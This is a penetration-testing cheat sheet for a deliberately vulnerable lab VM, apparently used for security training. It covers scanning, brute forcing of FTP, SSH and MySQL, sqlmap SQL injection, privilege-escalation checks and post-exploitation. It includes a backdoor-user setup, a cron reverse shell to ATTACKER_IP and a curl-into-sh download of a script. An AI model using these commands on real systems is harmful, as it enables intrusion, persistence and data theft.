# Liverpul Corp VM - Penetration Testing Cheat Sheet

## Target Information
```
IP Address: 192.168.56.10
Hostname: liverpul-corp
OS: Alpine Linux 3.18
```

---

## Reconnaissance Commands

### Host Discovery
```bash
# Ping sweep
ping -c 4 192.168.56.10

# ARP scan (if on same network)
sudo arp-scan 192.168.56.0/24
sudo netdiscover -r 192.168.56.0/24
```

### Port Scanning
```bash
# Quick scan
nmap -T4 -F 192.168.56.10

# Full port scan
nmap -p- 192.168.56.10

# Service version detection
nmap -sV -p 21,22,80,3306 192.168.56.10

# Aggressive scan (OS detection, version detection, scripts, traceroute)
nmap -A 192.168.56.10

# Scan with default scripts
nmap -sC -sV 192.168.56.10

# UDP scan (slower)
sudo nmap -sU --top-ports 100 192.168.56.10

# Export results
nmap -oA liverpul_scan 192.168.56.10
```

---

## FTP Enumeration (Port 21)

### Manual Connection
```bash
# Anonymous login
ftp 192.168.56.10
# Username: anonymous
# Password: (blank or any email)

# Using curl
curl ftp://192.168.56.10/ --user anonymous:

# Authenticated access
curl ftp://192.168.56.10/ --user username:password
```

### Banner Grabbing
```bash
# Using netcat
nc 192.168.56.10 21

# Using nmap
nmap -sV -p 21 --script=banner 192.168.56.10

# Using telnet
telnet 192.168.56.10 21
```

### FTP Brute Force
```bash
# Using hydra
hydra -L users.txt -P passwords.txt ftp://192.168.56.10
hydra -l pedro -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.10

# Using medusa
medusa -h 192.168.56.10 -u pedro -P passwords.txt -M ftp

# Using ncrack
ncrack -p ftp -u pedro -P passwords.txt 192.168.56.10
```

### FTP Scripts
```bash
# Nmap FTP scripts
nmap --script ftp-* 192.168.56.10 -p 21
nmap --script ftp-anon 192.168.56.10 -p 21
nmap --script ftp-brute 192.168.56.10 -p 21
```

---

## SSH Enumeration (Port 22)

### SSH Banner Grabbing
```bash
# Using netcat
nc 192.168.56.10 22

# Using nmap
nmap -sV -p 22 --script=ssh-* 192.168.56.10
```

### SSH Brute Force
```bash
# Using hydra
hydra -L users.txt -P passwords.txt ssh://192.168.56.10
hydra -l pedro -P rockyou.txt ssh://192.168.56.10

# Using medusa
medusa -h 192.168.56.10 -u pedro -P passwords.txt -M ssh

# Using nmap
nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt 192.168.56.10
```

### SSH Connection
```bash
# Standard connection
ssh username@192.168.56.10

# With password
sshpass -p 'password' ssh username@192.168.56.10

# Copy files
scp file.txt username@192.168.56.10:/tmp/
```

---

## Web Application Testing (Port 80)

### Web Reconnaissance
```bash
# Basic request
curl http://192.168.56.10

# View headers
curl -I http://192.168.56.10

# Follow redirects
curl -L http://192.168.56.10

# Save response
curl http://192.168.56.10 -o index.html

# Test API
curl http://192.168.56.10/api.php

# Pretty print JSON
curl -s http://192.168.56.10/api.php | jq .
curl -s http://192.168.56.10/api.php | python3 -m json.tool
```

### Directory Enumeration
```bash
# Using dirb
dirb http://192.168.56.10 /usr/share/wordlists/dirb/common.txt

# Using gobuster
gobuster dir -u http://192.168.56.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Using ffuf
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.56.10/FUZZ

# Using dirsearch
dirsearch -u http://192.168.56.10
```

### Web Vulnerability Scanning
```bash
# Nikto
nikto -h http://192.168.56.10

# WhatWeb
whatweb http://192.168.56.10

# Nmap HTTP scripts
nmap --script http-* 192.168.56.10 -p 80
nmap --script http-enum 192.168.56.10 -p 80
```

### SQL Injection Testing
```bash
# Manual testing
curl "http://192.168.56.10/api.php?id=1'"
curl "http://192.168.56.10/api.php?id=1 OR 1=1--"

# SQLMap
sqlmap -u "http://192.168.56.10/api.php?id=1" --dbs
sqlmap -u "http://192.168.56.10/api.php?id=1" --tables
sqlmap -u "http://192.168.56.10/api.php?id=1" --dump
sqlmap -u "http://192.168.56.10/api.php?id=1" --os-shell

# POST request
sqlmap -u "http://192.168.56.10/api.php" --data="id=1" --dbs
```

---

## MySQL Enumeration (Port 3306)

### MySQL Connection
```bash
# Connect to database
mysql -h 192.168.56.10 -u admin -p

# Connect with password
mysql -h 192.168.56.10 -u admin -padmin

# Connect to specific database
mysql -h 192.168.56.10 -u admin -padmin fakystore

# Execute command
mysql -h 192.168.56.10 -u admin -padmin -e "SHOW DATABASES;"
```

### MySQL Enumeration Commands
```sql
-- List databases
SHOW DATABASES;

-- Use database
USE fakystore;

-- List tables
SHOW TABLES;

-- Describe table structure
DESCRIBE products;
DESCRIBE customers;
DESCRIBE orders;

-- Show table contents
SELECT * FROM products;
SELECT * FROM customers;
SELECT * FROM orders;

-- Count records
SELECT COUNT(*) FROM products;

-- Show users
SELECT user, host FROM mysql.user;

-- Show privileges
SHOW GRANTS;
SHOW GRANTS FOR 'admin'@'localhost';

-- Show variables
SHOW VARIABLES LIKE '%version%';
SHOW VARIABLES LIKE '%datadir%';
```

### MySQL Brute Force
```bash
# Using hydra
hydra -L users.txt -P passwords.txt mysql://192.168.56.10

# Using medusa
medusa -h 192.168.56.10 -u admin -P passwords.txt -M mysql

# Using nmap
nmap -p 3306 --script mysql-brute --script-args userdb=users.txt,passdb=passwords.txt 192.168.56.10
```

### MySQL Scripts
```bash
# Nmap MySQL scripts
nmap --script mysql-* 192.168.56.10 -p 3306
nmap --script mysql-enum 192.168.56.10 -p 3306
nmap --script mysql-databases --script-args mysqluser=admin,mysqlpass=admin 192.168.56.10 -p 3306
```

---

## Password Cracking

### Hydra Syntax
```bash
# Basic syntax
hydra -l USERNAME -p PASSWORD PROTOCOL://TARGET

# Dictionary attack
hydra -l USERNAME -P /path/to/wordlist.txt PROTOCOL://TARGET

# Multiple users and passwords
hydra -L users.txt -P passwords.txt PROTOCOL://TARGET

# Verbose mode
hydra -l USERNAME -P passwords.txt -V PROTOCOL://TARGET

# Save output
hydra -l USERNAME -P passwords.txt PROTOCOL://TARGET -o results.txt
```

### Common Wordlists
```bash
# Rockyou (most common)
/usr/share/wordlists/rockyou.txt

# Custom wordlists in artifacts
../../artifacts/rockyou.txt
../../artifacts/darkweb2017_top-10000.txt

# SecLists
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt

# Create custom wordlist
crunch 6 8 -o passwords.txt  # 6-8 character passwords
cewl http://192.168.56.10 -w custom_wordlist.txt  # From website
```

### Hash Cracking
```bash
# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt

# Hashcat
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt  # MD5
hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt  # SHA-512
```

---

## Linux Privilege Escalation

### Initial Enumeration
```bash
# Current user
id
whoami
groups

# OS information
uname -a
cat /etc/os-release
cat /etc/issue

# Kernel version
uname -r
cat /proc/version

# Environment variables
env
echo $PATH

# Network information
ip addr
ifconfig
netstat -antup
ss -antup

# Running processes
ps aux
ps -ef
top

# Users
cat /etc/passwd
cat /etc/group
w
who
last
```

### SUID/SGID Binaries
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Find both
find / -perm -6000 -type f 2>/dev/null

# World-writable files
find / -perm -002 -type f 2>/dev/null

# World-writable directories
find / -perm -002 -type d 2>/dev/null
```

### Sudo Privileges
```bash
# Check sudo privileges
sudo -l

# Try common sudo commands
sudo su
sudo -i
sudo /bin/bash
sudo -s

# Check sudoers file (if readable)
cat /etc/sudoers
```

### Cron Jobs
```bash
# System cron jobs
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*

# User cron jobs
crontab -l
cat /var/spool/cron/*
```

### Capabilities
```bash
# List capabilities
getcap -r / 2>/dev/null
```

### Writable Files and Directories
```bash
# Writable files in /etc
find /etc -writable -type f 2>/dev/null

# Files owned by current user
find / -user $(whoami) 2>/dev/null

# Files in home directory
ls -laR ~
```

### Configuration Files
```bash
# Look for passwords in configs
grep -ri "password" /etc/ 2>/dev/null
grep -ri "pass" /etc/ 2>/dev/null
grep -ri "pwd" /etc/ 2>/dev/null

# Database configs
cat /var/www/*/config.php
cat /var/www/*/api.php

# Web server configs
cat /etc/nginx/nginx.conf
cat /etc/nginx/http.d/*.conf

# FTP configs
cat /etc/vsftpd/vsftpd.conf

# MySQL configs
cat /etc/my.cnf
cat /etc/my.cnf.d/*.cnf
```

### Automated Enumeration Scripts
```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Linux Smart Enumeration
wget "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh"
chmod +x lse.sh
./lse.sh -l 1

# Linux Exploit Suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

---

## Network Traffic Analysis

### Packet Capture
```bash
# Capture all traffic to/from target
sudo tcpdump -i eth0 host 192.168.56.10 -w capture.pcap

# Capture specific port
sudo tcpdump -i eth0 host 192.168.56.10 and port 21 -w ftp.pcap
sudo tcpdump -i eth0 host 192.168.56.10 and port 3306 -w mysql.pcap

# Capture HTTP traffic
sudo tcpdump -i eth0 host 192.168.56.10 and port 80 -w http.pcap

# Verbose output
sudo tcpdump -i eth0 host 192.168.56.10 -vv

# Display ASCII
sudo tcpdump -i eth0 host 192.168.56.10 -A
```

### Tshark Analysis
```bash
# Read pcap file
tshark -r capture.pcap

# Filter FTP
tshark -r capture.pcap -Y "ftp"
tshark -r capture.pcap -Y "ftp.request.command == USER"
tshark -r capture.pcap -Y "ftp.request.command == PASS"

# Filter HTTP
tshark -r capture.pcap -Y "http"
tshark -r capture.pcap -Y "http.request"

# Filter MySQL
tshark -r capture.pcap -Y "mysql"

# Extract credentials
tshark -r capture.pcap -Y "ftp" -T fields -e ftp.request.arg
```

### Wireshark Filters
```
# FTP
ftp

# FTP commands
ftp.request.command

# FTP passwords
ftp.request.command == "PASS"

# HTTP
http

# HTTP POST
http.request.method == "POST"

# MySQL
mysql

# All traffic to target
ip.addr == 192.168.56.10
```

---

## Post-Exploitation

### Data Exfiltration
```bash
# Copy database
mysqldump -h 192.168.56.10 -u admin -padmin fakystore > fakystore_backup.sql

# Download files via FTP
wget -r ftp://anonymous:@192.168.56.10/

# Download files via SCP
scp user@192.168.56.10:/path/to/file .

# Archive and compress
tar -czf loot.tar.gz /path/to/data
```

### Persistence (Educational - Remove After Testing)
```bash
# Add SSH key
echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys

# Create backdoor user (REMOVE AFTER LAB)
sudo adduser backdoor
sudo usermod -aG sudo backdoor

# Cron job callback (REMOVE AFTER LAB)
(crontab -l ; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'") | crontab -
```

### Covering Tracks (Theory Only - Don't Hide Evidence in Labs)
```bash
# View logs (understand what's recorded)
ls -la /var/log/
tail -f /var/log/auth.log
tail -f /var/log/nginx/access.log
tail -f /var/log/vsftpd.log

# Command history
cat ~/.bash_history
history
```

---

## Useful One-Liners

### Create Username List
```bash
echo -e "pedro\npablo\npaco\nadmin\nroot" > users.txt
```

### Create Simple Password List
```bash
echo -e "password\n123456\nadmin\nwelcome\nfootball\nsunshine" > passwords.txt
```

### Quick All-Ports Scan
```bash
nmap -p- --min-rate=1000 -T4 192.168.56.10
```

### Banner Grab All Services
```bash
nmap -sV --script=banner 192.168.56.10
```

### Test All FTP Users
```bash
for user in pedro pablo paco; do echo "Testing $user"; hydra -l $user -P passwords.txt ftp://192.168.56.10 -V; done
```

### Extract All Database Data
```bash
mysql -h 192.168.56.10 -u admin -padmin fakystore -e "SELECT * FROM products; SELECT * FROM customers; SELECT * FROM orders;"
```

---

## Tool Installation

### Install Common Tools
```bash
# Update package list
sudo apt update

# Essential tools
sudo apt install -y nmap netcat curl wget nikto dirb gobuster sqlmap

# Password cracking
sudo apt install -y hydra medusa john

# Network analysis
sudo apt install -y wireshark tcpdump tshark

# MySQL client
sudo apt install -y mysql-client

# FTP client
sudo apt install -y ftp

# Additional tools
sudo apt install -y whatweb wpscan enum4linux smbclient
```

---

## Quick Reference Table

| Service | Port | Default Creds | Notes |
|---------|------|---------------|-------|
| FTP | 21 | anonymous:(blank) | Anonymous enabled |
| SSH | 22 | pedro:? | Dictionary password |
| HTTP | 80 | N/A | Angular Material app |
| MySQL | 3306 | admin:admin | Remote access enabled |

---

## Common Mistakes to Avoid

1. **Not documenting findings** - Keep detailed notes
2. **Skipping enumeration** - More enumeration = better results
3. **Using wrong wordlists** - Use appropriate dictionaries
4. **Ignoring version numbers** - Versions can indicate vulnerabilities
5. **Not taking screenshots** - Evidence is crucial
6. **Forgetting to clean up** - Remove backdoors after testing
7. **Testing without permission** - Only test authorized systems

---

## Reporting Tips

### Screenshot Checklist
- [ ] Initial nmap scan results
- [ ] Service version enumeration
- [ ] Successful credential discovery
- [ ] Database access proof
- [ ] Privilege escalation steps
- [ ] Final root/admin access

### Evidence to Collect
- Command history (`history > commands.txt`)
- Scan results (`nmap -oA results`)
- Packet captures (`.pcap` files)
- Database dumps
- Configuration files
- Screenshots of key findings

---

## Time Estimates

- Reconnaissance: 15-30 minutes
- Service Enumeration: 30-45 minutes
- Password Cracking: 10-60 minutes (depends on wordlist)
- Initial Access: 15-30 minutes
- Privilege Escalation: 30-90 minutes
- Documentation: 60-120 minutes

**Total: 2.5 - 6 hours** for complete assessment

---

## Emergency Commands

### Reset Everything
```bash
vagrant destroy -f && vagrant up
```

### Restart Services (from within VM)
```bash
vagrant ssh
sudo rc-service mariadb restart
sudo rc-service nginx restart
sudo rc-service vsftpd restart
sudo rc-service php-fpm81 restart
```

### Check VM Status
```bash
vagrant status
vagrant ssh -c "sudo rc-service --list"
```

---

## Additional Resources

- GTFOBins: https://gtfobins.github.io/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- HackTricks: https://book.hacktricks.xyz/
- Nmap Scripts: https://nmap.org/nsedoc/
- Reverse Shell Generator: https://www.revshells.com/

---

**Remember**: This is for educational purposes only. Always obtain proper authorization before testing any system.
